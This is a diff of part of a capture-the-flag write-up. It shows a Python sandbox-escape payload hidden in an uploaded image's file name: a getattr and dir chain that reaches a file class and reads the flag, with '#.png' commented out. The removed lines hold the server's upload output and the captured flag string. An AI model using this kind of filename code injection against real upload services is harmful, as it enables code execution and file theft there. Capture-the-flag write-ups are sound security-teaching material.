@@ -107,24 +107,5 @@ Adding () to call the __subclasses__ function.
 Let's combine our payload and upload it to get the flag.
 ```mv payload.png "print getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()[40]('flag').read()#.png"```
 
-```
-File is an image - image/png
-The file: print getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'), dir([])[1]))[34])()[40]('flag').read()#.png has been uploaded.
-File: print getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'), dir([])[1]))[34])()[40]('flag').read()#.png
-Size: 58001
-Type: image/png
 
-
-
-print getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'), dir([])[1]))[34])()[40]('flag').read()#.png
-
-
-inctf{w0w_pyth0n_mad3_my_lif3_s0_3z}
-```
-
-
-
-
-
-
-
+8.png
